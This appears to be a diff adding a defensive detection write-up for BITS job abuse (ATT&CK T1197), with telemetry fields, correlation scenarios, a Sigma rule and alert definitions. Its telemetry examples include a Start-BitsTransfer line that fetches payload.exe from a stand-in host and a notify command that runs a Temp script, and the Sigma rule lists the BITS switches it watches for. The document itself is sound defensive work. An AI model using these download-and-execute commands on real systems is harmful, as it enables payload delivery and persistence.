@@ -1,0 +1,556 @@
+-TA0002 - Execution
+  -- T1197 - BITS Jobs
+
+# THREAT DESCRIPTION
+
+  Adversaries may abuse Background Intelligent Transfer Service (BITS) to create or modify background transfer jobs for malicious purposes.
+  BITS is a legitimate Windows service used to transfer files asynchronously over HTTP, HTTPS, or supported SMB paths while providing transfer persistence and automatic retries.
+  Attackers may leverage BITS jobs to download malicious payloads, upload sensitive information, or facilitate communication with attacker-controlled infrastructure.
+  Malicious BITS jobs may be created or modified through bitsadmin.exe, PowerShell BITS cmdlets, COM interfaces, or other applications interacting with the BITS service.
+  BITS jobs may survive the termination of the initiating process and persist across user logoff or system restarts, although transfer activity depends on job configuration and the owning user's session.
+  Attackers may also configure BITS notification commands to execute malicious programs when specific job events occur, including transfer completion or error conditions.
+  Long-lived jobs, recurring transfers, and suspicious notification commands may support persistence, payload execution, data exfiltration, or command and control activity.
+  Successful BITS abuse may facilitate further endpoint compromise while blending malicious activity with legitimate Windows background transfer operations.
+
+# THREAT MODEL
+
+  - Attacker Goal:
+      Abuse legitimate BITS functionality to establish malicious background transfers, facilitate command and control communication, or maintain persistent execution capabilities
+
+  - Prerequisites:
+      Ability to execute commands or code on the target endpoint
+      Access to BITS interfaces or utilities
+      Ability to create or modify BITS jobs within the applicable security context
+      Network connectivity to attacker-controlled infrastructure when remote transfers are required
+
+  - Potential Impact:
+      Malicious Payload Delivery
+      Command Execution
+      Command and Control
+      Data Exfiltration
+      Persistence Establishment
+      Defense Evasion
+      Further Endpoint Compromise
+
+# TELEMETRY SOURCES
+
+  - BITS Client Operational Logs
+  - BITS Job Metadata
+  - Endpoint Detection and Response Telemetry
+  - Process Creation Events
+  - PowerShell Script Block Logs
+  - PowerShell Module Logs
+  - Network Connection Events
+  - DNS Logs
+  - Proxy Logs
+  - File Creation Events
+  - Windows Event Logs
+  - Windows Service Telemetry
+  - User Logon and Logoff Events
+
+# DETECTION TELEMETRY
+
+  - BITS Job Events
+
+      -- Relevant Fields:
+          --- JobId
+          --- JobName
+          --- JobOwner
+          --- JobType
+          --- JobState
+          --- RemoteUrl
+          --- LocalFilePath
+          --- NotifyCommand
+          --- NotifyParameters
+          --- JobCreationTime
+          --- JobModificationTime
+          --- EventTimestamp
+
+      * Example:
+          ** JobName: SystemUpdate
+          ** JobType: Download
+          ** RemoteUrl: https://updates.example.net/payload.exe
+          ** LocalFilePath: C:\Users\User\AppData\Local\Temp\payload.exe
+          ** JobState: Transferring
+
+  - Process Creation Events
+
+      -- Relevant Fields:
+          --- ParentProcessName
+          --- ParentProcessGuid
+          --- ProcessName
+          --- Image
+          --- CommandLine
+          --- ProcessId
+          --- ProcessGuid
+          --- User
+
+      * Example:
+          ** ParentProcessName: powershell.exe
+          ** ProcessName: bitsadmin.exe
+          ** CommandLine: bitsadmin.exe /create SystemUpdate
+
+  - PowerShell Events
+
+      -- Relevant Fields:
+          --- ScriptBlockText
+          --- CommandLine
+          --- User
+          --- ProcessId
+          --- EventTimestamp
+
+      * Example:
+          ** ScriptBlockText: Start-BitsTransfer -Source https://updates.example.net/payload.exe -Destination C:\Users\User\AppData\Local\Temp\payload.exe
+
+  - Network Connection Events
+
+      -- Relevant Fields:
+          --- SourceIp
+          --- DestinationIp
+          --- DestinationPort
+          --- ProcessName
+          --- ProcessId
+          --- Protocol
+          --- EventTimestamp
+
+      * Example:
+          ** ProcessName: svchost.exe
+          ** DestinationIp: 198.51.100.25
+          ** DestinationPort: 443
+          ** Protocol: TCP
+
+  - File Creation Events
+
+      -- Relevant Fields:
+          --- Image
+          --- TargetFilename
+          --- FileHash
+          --- User
+          --- EventTimestamp
+
+      * Example:
+          ** Image: svchost.exe
+          ** TargetFilename: C:\Users\User\AppData\Local\Temp\payload.exe
+
+  - BITS Notification Configuration
+
+      -- Relevant Fields:
+          --- JobId
+          --- JobOwner
+          --- NotifyCommand
+          --- NotifyParameters
+          --- JobState
+          --- EventTimestamp
+
+      * Example:
+          ** JobName: SystemUpdate
+          ** NotifyCommand: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+          ** NotifyParameters: -NoProfile -File C:\Users\User\AppData\Local\Temp\update.ps1
+
+  - Windows Service Events
+
+      -- Relevant Fields:
+          --- ServiceName
+          --- ServiceProcessId
+          --- ServiceState
+          --- EventTimestamp
+
+      * Example:
+          ** ServiceName: BITS
+          ** ServiceState: Running
+
+  - User Session Events
+
+      -- Relevant Fields:
+          --- User
+          --- LogonId
+          --- LogonType
+          --- SessionState
+          --- EventTimestamp
+
+# CORRELATION LOGIC
+
+  - Objective:
+
+    -- Identify suspicious BITS job creation or modification associated with malicious remote destinations, recurring background transfers, suspicious notification commands, or potential command and control activity.
+
+  - Correlation Criteria:
+
+    -- Scenario 1:
+      --- Suspicious process creates or modifies a BITS job targeting an external destination
+
+    -- Scenario 2:
+      --- BITS job transfers executable or script content into temporary or user-writable directories
+
+    -- Scenario 3:
+      --- BITS job is configured with a suspicious notification command capable of executing a program
+
+    -- Scenario 4:
+      --- BITS job communicates with a destination identified as malicious by threat intelligence
+
+    -- Scenario 5:
+      --- Repeated BITS transfers to the same unusual external destination are observed over time
+
+    -- Scenario 6:
+      --- Suspicious BITS job activity is followed by execution of a transferred payload
+
+    -- Scenario 7:
+      --- BITS job completion or error is followed by execution of its configured notification command
+
+    -- Scenario 8:
+      --- BITS service process launches a suspicious child process matching the notification command configured in a BITS job
+
+    -- Scenario 9:
+      --- Long-lived BITS job maintains suspicious notification command configuration or repeated transfers to an unusual remote destination
+
+    -- Scenario 10:
+      --- BITS job created or modified through COM interfaces is identified through BITS job lifecycle telemetry and correlated with suspicious network or process activity
+
+    -- BITS Abuse Identification:
+
+      --- BITS job created or modified by an unusual initiating process
+      --- Job references an external destination not associated with approved software services
+      --- Job downloads executable or script content into suspicious directories
+      --- Job contains suspicious notification command configuration
+      --- Job reaches completion or error state before suspicious notification command execution
+      --- BITS service process launches a suspicious child process associated with the configured notification command
+      --- Repeated transfer activity involving the same unusual remote destination
+      --- Long-lived job retains suspicious configuration or transfer behavior
+      --- Downloaded payload executed following transfer completion
+      --- Job destination matches known malicious infrastructure
+
+    - Correlation Keys:
+
+      -- Host Identifier + BITS JobId + Event Timestamp for job lifecycle correlation
+      -- BITS JobId should be used as the primary job identifier whenever available
+      -- Remote URL, Destination IP Address, BITS Service Process Identifier, and Event Timestamp for network correlation
+      -- Network events should not be attributed to a specific BITS job without sufficient supporting evidence
+
+    - Time Window:
+
+      -- 5 Minutes for job creation or modification correlation
+      -- 5 Minutes for job completion or error followed by notification command execution
+      -- Extended observation window of 24 Hours for recurring transfers and long-lived jobs
+      -- Historical job state comparisons for activity occurring outside the observation window
+
+    - Expected Behavior:
+
+      -- Legitimate BITS jobs should generally originate from approved applications and interact with expected remote services.
+      -- BITS jobs should not unexpectedly execute suspicious notification commands or transfer malicious payloads.
+      -- Recurring transfers and long-lived jobs should be evaluated against approved application behavior and enterprise update activity.
+
+    - Detection Outcome:
+
+      -- Medium to High-confidence indication of suspicious BITS abuse, with potential command and control or persistence activity when supported by additional evidence.
+
+# INVESTIGATION ENRICHMENT
+
+  - Asset Context
+
+      -- Endpoint Name
+      -- Assigned User
+      -- Operating System
+      -- Asset Criticality
+
+  - BITS Job Context
+
+      -- Job Identifier
+      -- Job Name
+      -- Job Owner
+      -- Job Type
+      -- Job State
+      -- Remote URL
+      -- Local File Path
+      -- Notification Command
+      -- Notification Parameters
+      -- Job Creation Time
+      -- Job Modification Time
+      -- Job Duration
+
+  - Process Context
+
+      -- Initiating Process
+      -- Parent Process
+      -- Command Line
+      -- Process Identifier
+      -- Process GUID
+      -- Digital Signature
+      -- BITS Service Process Identifier
+
+  - Network Context
+
+      -- Destination IP Address
+      -- Destination Domain
+      -- ASN
+      -- Reputation Score
+      -- Connection Frequency
+      -- Transfer Frequency
+      -- Network Protocol
+
+  - User Session Context
+
+      -- Job Owner
+      -- Logon Session
+      -- Session State
+      -- Logon Time
+      -- Logoff Time
+
+  - Threat Intelligence
+
+      -- Known Malicious Domains
+      -- Known Malicious IP Addresses
+      -- Known Malware Hashes
+      -- Command and Control Infrastructure
+
+# DETECTION STRATEGY
+
+  Detection relies on identifying suspicious BITS job creation or modification activity and correlating job metadata with process execution, remote destinations, file transfers, and network telemetry.
+  Particular attention is given to jobs created by unusual processes, jobs targeting untrusted external infrastructure, and jobs configured with suspicious notification commands.
+  BITS job lifecycle events are used, when available, to identify suspicious configuration changes, recurring transfers, completion or error conditions, and long-lived jobs.
+  Additional correlation with notification command execution, payload execution, user session context, and threat intelligence increases detection confidence.
+  Detection of suspicious processes launched by the BITS service is considered supporting correlation evidence and is not implemented as a separate Sigma rule within this Detection Story.
+
+# DETECTION LOGIC NOTES
+
+  - BITS is a legitimate Windows service extensively used by Windows and third-party applications.
+  - BITS job creation alone does not indicate malicious activity.
+  - BITS command-line activity should be treated as an initial detection signal rather than proof of malicious behavior.
+  - BITS transfers may continue after the initiating process exits.
+  - BITS jobs may persist across system restarts, while transfer execution is affected by the owning user's logon state and job configuration.
+  - Legitimate BITS network traffic may originate from svchost.exe hosting the BITS service.
+  - Network connections attributed to svchost.exe must be associated with the BITS service instance before being considered BITS-related.
+  - Process ancestry and BITS job ownership should be considered when identifying suspicious activity.
+  - PowerShell and bitsadmin.exe are not the only mechanisms available for interacting with BITS.
+  - COM-based BITS activity may not generate observable bitsadmin.exe or PowerShell process creation events.
+  - BITS job lifecycle telemetry should be used to identify job activity independently of the initiating utility when available.
+  - BITS notification command configuration and actual notification command execution are separate detection conditions.
+  - BITS notification commands may execute after job completion or error conditions.
+  - Suspicious child processes launched by the BITS service should be correlated with the configured notification command and relevant job state.
+  - BITS job modification and notification command configuration may indicate malicious execution or persistence behavior.
+  - Long-lived jobs and repeated transfers require extended observation windows.
+  - Repeated transfers to the same external destination require contextual analysis before being classified as C2.
+  - File transfer activity and subsequent process execution significantly increase detection confidence.
+  - BITS job identifiers should be used whenever available to correlate job lifecycle events.
+  - Network connections alone may not reliably identify the originating BITS job.
+  - Detection quality depends on BITS logging configuration, endpoint visibility, and network telemetry.
+
+# SIGMA
+
+  - Process Creation
+
+    title: Suspicious BITS Job Creation Or Modification
+    id: 8e92f64d-9d7a-4c5f-b812-2a09e03c6f41
+    status: experimental
+
+    description: >
+      Detects command-line activity associated with BITS job
+      creation, modification, or suspicious notification
+      command configuration that may indicate abuse of
+      Background Intelligent Transfer Service.
+
+    logsource:
+      category: process_creation
+      product: windows
+
+    detection:
+
+      selection_bitsadmin:
+        Image|endswith:
+          - '\bitsadmin.exe'
+
+        CommandLine|contains:
+          - '/create'
+          - '/addfile'
+          - '/addfilewithranges'
+          - '/setnotifycmdline'
+          - '/setcustomheaders'
+
+      selection_powershell:
+        Image|endswith:
+          - '\powershell.exe'
+          - '\pwsh.exe'
+
+        CommandLine|contains:
+          - 'Start-BitsTransfer'
+          - 'Add-BitsFile'
+          - 'Set-BitsTransfer'
+
+      condition: selection_bitsadmin or selection_powershell
+
+    falsepositives:
+      - Legitimate Windows Administration
+      - Authorized Software Deployment
+      - Enterprise Update Management
+      - Administrative Automation
+      - Approved Background File Transfers
+
+    level: medium
+
+    tags:
+      - attack.execution
+      - attack.t1197
+
+# LEVEL CONSIDERATIONS
+
+  The Sigma rule alone provides Medium-priority detection of BITS command-line activity requiring additional investigation.
+  Legitimate administrative operations and software deployment mechanisms may generate similar telemetry.
+  The Sigma rule identifies command-line indicators of BITS usage but does not independently confirm successful job creation, malicious job configuration, or command and control communication.
+  A Medium severity level should not be interpreted as Medium confidence in malicious activity.
+  High-confidence detection is achieved through correlation with BITS job metadata, unusual remote destinations, suspicious notification commands, and subsequent malicious activity.
+  Additional confidence is obtained when job completion or error conditions are followed by execution of a matching suspicious notification command.
+  Consequently, the Sigma rule severity is Medium while correlated alert severity may range from High to Critical depending on observed malicious behavior.
+
+# IMPLEMENTATION NOTES
+
+  BITS job activity may be initiated through bitsadmin.exe, PowerShell, COM interfaces, or other applications.
+  Organizations should adapt detection logic according to their Windows environment, endpoint telemetry, and approved BITS usage.
+  The Sigma rule represents the initial BITS job activity detection layer.
+  PowerShell command-line visibility may be insufficient for detecting all BITS operations; Script Block Logging and BITS-specific telemetry should be incorporated when available.
+  BITS Client Operational logs should be evaluated to identify supported job lifecycle events and available metadata.
+  BITS job metadata should be collected when available to identify remote URLs, local paths, job owners, job states, and notification command configuration.
+  The availability of individual BITS fields varies between telemetry sources and Windows configurations.
+  Correlation of BITS network activity should account for svchost.exe service hosting and should not assume that every svchost.exe connection belongs to BITS.
+  The five-minute correlation window is intended for closely related events, while long-lived jobs and recurring transfers require extended observation.
+  Long-lived BITS jobs should also be evaluated using periodic job inventory and historical job state comparisons, as recurring activity may occur outside the observation window.
+  BITS notification command configuration must be distinguished from actual notification command execution.
+  Confirmation of notification command execution requires process creation telemetry correlated with the relevant BITS service instance, job state, and configured notification command.
+  The separate detection of suspicious BITS service child process execution is outside the Sigma scope of this Detection Story.
+  High-confidence alert generation should be performed through SIEM-side enrichment and correlation between:
+
+    - BITS Job Events
+    - BITS Job Metadata
+    - Process Creation Events
+    - PowerShell Events
+    - Network Connection Events
+    - File Creation Events
+    - DNS / Proxy Events
+    - Windows Service Events
+    - User Session Events
+    - Threat Intelligence
+
+  using:
+
+    - Host Identifier
+    - BITS Job Identifier (preferred for job lifecycle correlation)
+    - Event Timestamp
+    - Username
+    - BITS Job Owner
+    - Process Identifier
+    - Process GUID
+    - Parent Process GUID
+    - BITS Service Process Identifier
+    - Remote URL
+    - Destination IP Address
+    - File Path
+    - Job State
+    - Notification Command
+
+  to determine whether BITS job creation or modification resulted in malicious file transfers, suspicious recurring communication, notification command execution, payload execution, persistence activity, or confirmed command and control communication.
+
+# ALERT DEFINITION
+
+  - Alert Name:
+    -- Suspicious BITS Job Creation Or Modification
+
+  - Severity:
+    -- Medium
+
+  - Trigger:
+    -- Process executes monitored BITS job creation or modification commands
+
+  - Confidence:
+    -- Low until additional suspicious job context is established
+
+  - Alert Name:
+    -- BITS Job With Suspicious Remote Destination
+
+  - Severity:
+    -- High
+
+  - Trigger:
+    -- BITS job creation or modification correlated with a remote destination identified as malicious or strongly suspicious
+
+  - Confidence:
+    -- High when supported by reliable destination intelligence
+
+  - Alert Name:
+    -- BITS Job With Suspicious Notification Command
+
+  - Severity:
+    -- High
+
+  - Trigger:
+    -- BITS job configured with a suspicious notification command capable of executing a program
+
+  - Confidence:
+    -- High when malicious configuration indicators are present
+
+  - Alert Name:
+    -- Suspicious BITS Job Followed By Payload Execution
+
+  - Severity:
+    -- High
+
+  - Trigger:
+    -- BITS job transfers an executable or script that is subsequently executed on the same endpoint
+
+  - Confidence:
+    -- High when transfer and execution are reliably correlated
+
+  - Alert Name:
+    -- Suspicious Long-Lived BITS Job Activity
+
+  - Severity:
+    -- High
+
+  - Trigger:
+    -- Long-lived BITS job maintains suspicious notification command configuration or repeated transfers to an unusual remote destination
+
+  - Confidence:
+    -- Medium to High depending on supporting evidence
+
+  - Alert Name:
+    -- BITS Job Associated With Command And Control Activity
+
+  - Severity:
+    -- Critical
+
+  - Trigger:
+    -- Suspicious BITS job activity correlated with confirmed malicious infrastructure and additional evidence of command and control communication
+
+  - Confidence:
+    -- High
+
+# DETECTION COVERAGE
+
+  - Detected:
+
+    -- BITS Job Creation Through Monitored Command-Line Tools
+    -- BITS Job Modification Through Monitored Command-Line Tools
+    -- Suspicious BITS Notification Command Configuration Through Available Job Metadata
+    -- BITS Job Lifecycle Activity When Telemetry Is Available
+    -- COM-Based BITS Job Activity Through Available Job Telemetry
+    -- Potentially Malicious Background File Transfers
+    -- BITS Job Communication With Suspicious Remote Destinations
+    -- Suspicious Recurring BITS Transfer Activity
+    -- Suspicious Long-Lived BITS Jobs
+    -- BITS-Based Payload Delivery
+    -- Payload Execution Following BITS Transfers
+    -- Potential BITS-Based Command And Control Activity
+
+  - Potential Gaps:
+
+    -- BITS Job Creation Through COM Interfaces Without Job Telemetry
+    -- BITS Job Modification Without Observable Command-Line Or Job Activity
+    -- Missing BITS Client Operational Logs
+    -- Missing PowerShell Script Block Telemetry
+    -- Missing Notification Command Configuration Data
+    -- Encrypted Traffic Without Inspection
+    -- Legitimate-looking BITS Jobs
+    -- Attacker-Controlled Infrastructure Without Known Indicators
+    -- Missing Network Telemetry
+    -- Long-Lived Jobs Outside Observation Windows
+    -- Incomplete BITS Job Metadata
+    -- Missing Windows Service Attribution
+    -- Command And Control Activity Without Distinctive Network Patterns
+    -- BITS Service Child Process Execution Without Dedicated Detection Logic
